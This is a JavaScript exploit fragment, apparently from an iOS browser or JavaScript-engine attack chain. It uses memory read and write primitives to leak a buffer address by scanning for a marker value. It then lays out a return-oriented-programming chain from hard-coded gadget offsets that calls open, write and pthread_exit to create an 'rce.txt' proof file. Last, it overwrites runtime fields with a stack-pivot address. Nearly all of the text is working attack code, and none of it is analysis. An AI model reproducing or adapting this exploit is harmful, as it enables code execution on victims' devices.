(function(){var T=B,S=F,d=U,b=D,_=R,h=W,y=Y,a=X,i=M,c=K;var libcFree=0x100000000000n;var OPEN=libcFree+0x296b394cn,WRITE=libcFree+0x296b3738n,PEXIT=libcFree+0x4a21a474n;
var G_CALL=T+0x3292cn,G_LOAD=T+0x172d96cn,G_X0=T+0x628a2cn,PIVOT2=libcFree-0x66cccfcn;


function u64(x){return BigInt.asUintN(64,x);}
function put64_(arr,off,val){var v=u64(val);for(var i=0;i<8;i++)arr[off+i]=Number((v>>BigInt(i*8))&0xffn);}
function bt(x){var t=new Array(8);for(var i=0;i<8;i++)t[i]=Number(x>>BigInt(i*8)&0xffn);return t}
/* ===== iOS 6s ROP: UB leak + TRIG chain + open/write/pthread_exit ===== */
var HOSTCFG=1; /* set 1 in the host variant */
var MAG=0x1122334455667788n;
var UB=globalThis.UB;if(!UB){i("U_NOUB");return;}put64_(UB,0x400,MAG);
var U=0n,lim=0x10000n,off;
for(off=b;off<b+lim;off+=8n){var w=_ (off);if((w&0xffffffffn)===2048n){var p=_(off+16n);var pq=p&0x00ffffffffffffffn;if(pq>0x10000n&&pq<0x0001000000000000n&&0n===(7n&p)){try{if(_(p+0x400n)===MAG){U=p;break;}}catch(e){}}}}
if(U===0n){for(off=b-8n;off>b-lim;off-=8n){var w2=_(off);if((w2&0xffffffffn)===2048n){var p2=_(off+16n);var pq2=p2&0x00ffffffffffffffn;if(pq2>0x10000n&&pq2<0x0001000000000000n&&0n===(7n&p2)){try{if(_(p2+0x400n)===MAG){U=p2;break;}}catch(e){}}}}}
if(U===0n){i("U_NF D="+a(b));return;}
var PATH='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt';
var MSG='RCE_OK\n';
function a8(x){return(x+7)&~7;}
var oPath=0,oMsg=a8(oPath+PATH.length+1),oA0=a8(oMsg+MSG.length+1),oB0=oA0+0x40,oA1=oB0+0x40,oB1=oA1+0x40,oEnd=oB1+0x40;
for(var z=0;z<oEnd;z++)UB[z]=0;
for(var z2=0;z2<PATH.length;z2++)UB[oPath+z2]=PATH.charCodeAt(z2)&0xff;
for(var z3=0;z3<MSG.length;z3++)UB[oMsg+z3]=MSG.charCodeAt(z3)&0xff;
UB[oA0+0x10]=0x01;UB[oA0+0x11]=0x06;UB[oA0+0x18]=0xa4;UB[oA0+0x19]=0x01;
put64_(UB,oB0+0x28,U+BigInt(oPath));put64_(UB,oA1+0x10,U+BigInt(oMsg));UB[oA1+0x18]=MSG.length;
var TRIG=new Uint8Array(4096);for(var i1=0;i1<4096;i1++)TRIG[i1]=0;
put64_(TRIG,0x08,U+BigInt(oB0));put64_(TRIG,0x10,G_LOAD);put64_(TRIG,0x18,U+BigInt(oA0));
put64_(TRIG,0xB8,U+BigInt(oB0));put64_(TRIG,0xD0,OPEN);put64_(TRIG,0xE0,G_X0);
put64_(TRIG,0xF0,G_LOAD);put64_(TRIG,0xF8,U+BigInt(oA1));put64_(TRIG,0x110,G_CALL);
put64_(TRIG,0x1A0,WRITE);put64_(TRIG,0x1C0,G_CALL);put64_(TRIG,0x248,U+BigInt(oB1));
put64_(TRIG,0x260,PEXIT);put64_(TRIG,0x270,G_X0);
i("U_RDY "+a(U)+" D="+a(b)+" DL="+a(U>b?U-b:b-U)+" O="+(off>b?"+":"-")+a(off>b?off-b:b-off)+" RT="+a(d)+" PATH="+PATH);
if(HOSTCFG){return;}
var RT_FREE=d+16n,RT_USABLE=d+32n,RT_SIZE=d+48n,RT_OPAQUE=d+64n;
var HUGE=0xffffffffffffffffn,ZERO=0n;
var bF=bt(G_CALL),bO=bt(0n),bS=bt(0xffffffffffffffffn),bP=bt(PIVOT2);
g0(d);
for(var q1=0;q1<8;q1++)v[0x10+q1]=bF[q1];
for(var q2=0;q2<8;q2++)v[0x40+q2]=bO[q2];
for(var q3=0;q3<8;q3++)v[0x30+q3]=bS[q3];
for(var q4=0;q4<8;q4++)v[0x20+q4]=bP[q4];
TRIG=null;
i("U_AFTER");
})();